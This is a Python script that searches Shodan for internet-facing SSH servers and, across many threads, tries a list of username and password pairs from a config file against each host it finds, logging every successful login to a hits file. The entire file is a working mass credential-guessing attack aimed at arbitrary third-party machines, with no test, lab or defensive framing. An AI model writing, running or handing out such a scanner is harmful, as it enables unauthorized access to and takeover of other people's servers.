import json, threading, socket, time
import shodan, paramiko

config = json.loads(open('config.json', 'r').read())
api = shodan.Shodan(config['shodan'])
already_seen = []
servers = []

def loop():
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())


    for server in servers:
        host = server['ip_str']
        if host not in already_seen:
            for credential in config['credentials']:
                username, password = credential['username'], credential['password']

                try:
                    client.connect(hostname=host, username=credential['username'], password=credential['password'], timeout=config['timeout'], banner_timeout=200)

                    print(f'cracked login for {host}')

                    with open('hits.txt', 'a+') as f:
                        f.write(f'{username}:{password} @ {host}\n')
                        break
                except paramiko.SSHException:
                    continue
                except paramiko.AuthenticationException:
                    continue
                except:
                    print('unhandled exception')
                    break

            already_seen.append(host)


if __name__ == '__main__':
    result = api.search("ssh")
    total = '{0:,}'.format(result['total'])
    print(f'found {total} servers running ssh')
    servers = result['matches']

    threads = []
    for i in range(config['threads']):
        thread = threading.Thread(target=loop, daemon=True)
        threads.append(thread)
        thread.start()
        print(f'created thread #{i + 1}')
    for thread in threads:
        thread.join()
        print('joined thread')